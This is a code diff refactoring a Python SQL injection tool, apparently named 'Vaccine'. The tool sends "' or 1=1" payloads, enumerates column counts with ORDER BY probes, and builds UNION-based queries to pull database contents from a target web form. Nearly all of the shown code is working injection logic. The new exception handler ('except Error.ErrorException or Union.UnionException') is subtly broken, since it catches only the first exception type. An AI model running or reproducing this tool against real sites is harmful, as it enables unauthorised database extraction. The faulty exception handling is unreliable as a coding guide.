@@ -74,34 +74,25 @@ class VaccineHelper:
 		self.original_text = self.submit("").text
 		self.normal_text = self.submit("' or 1=1" + self.comment).text
 
-class Union:
-	class UnionException(Exception):
+class Error:
+	class ErrorException(Exception):
 		pass
 
-	def __init__(self, helper, get_input):
-		print(f"{Style.GREEN}< UNION comment:{helper.comment} >{Style.RESET}")
+	def __init__(self, helper):
+		print(f"{Style.GREEN}< ERROR comment:{helper.comment} >{Style.RESET}")
 		self.submit = helper.submit
 		self.delimiter = helper.delimiter
-		self.header = self.delimiter + " UNION "
 		self.comment = helper.comment
-		self.get_input = get_input
-
 		self.original_text = helper.original_text
 		self.normal_text = helper.normal_text
-		self.column_counts = self.check_num_colums()
 
-		self.mysql = True
-
-		self.db_name = None
-		self.table_name = None
-
-	def check_num_colums(self):
+	def error(self):
 		flag = 0
 		for i in range(1, 12):
 			q = f" ORDER BY {i}"
 			query = self.delimiter + q + self.comment
 			res = self.submit(query)
-			#print(res.text)
+			print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
 			result = get_diff(self.original_text, res.text)
 			if res.text and not result:
 				flag = 1
@@ -112,13 +103,33 @@ class Union:
 				continue
 			if not result:
 				continue
-			#print("result", result)
 			break
 		column_counts = i - flag
 		if column_counts == 0 or column_counts >= 10:
-			raise self.UnionException("this method does not work")
-		#print(f"column counts: {column_counts}")
+			raise self.ErrorException("this method does not work")
+		print(f"column counts: {column_counts}")
 		return column_counts
+
+class Union:
+	class UnionException(Exception):
+		pass
+
+	def __init__(self, helper, get_input, column_counts):
+		print(f"{Style.GREEN}< UNION comment:{helper.comment} >{Style.RESET}")
+		self.submit = helper.submit
+		self.delimiter = helper.delimiter
+		self.header = self.delimiter + " UNION "
+		self.comment = helper.comment
+		self.get_input = get_input
+
+		self.original_text = helper.original_text
+		self.normal_text = helper.normal_text
+		self.column_counts = column_counts
+
+		self.mysql = True
+
+		self.db_name = None
+		self.table_name = None
 
 	def submit_query(self, column_name, contents=""):
 		column_lst = ["null"] * (self.column_counts - 1)
@@ -315,17 +326,21 @@ class Vaccine:
 	def vaccine(self):
 		try:
 			v = VaccineHelper(self.submit, "#")
-			u = Union(v, self.get_input)
+			e = Error(v)
+			column_counts = e.error()
+			u = Union(v, self.get_input, column_counts)
 			u.union()
-		except Union.UnionException as e:
+		except Error.ErrorException or Union.UnionException as e:
 			error_continue(e)
 		except Exception as e:
 			error_exit(e)
 		try:
 			v = VaccineHelper(self.submit, "--")
-			u2 = Union(v, self.get_input)
+			e = Error(v)
+			column_counts = e.error()
+			u2 = Union(v, self.get_input, column_counts)
 			u2.union()
-		except Union.UnionException as e:
+		except Error.ErrorException or Union.UnionException as e:
 			error_continue(e)
 		except Exception as e:
 			error_exit(e)
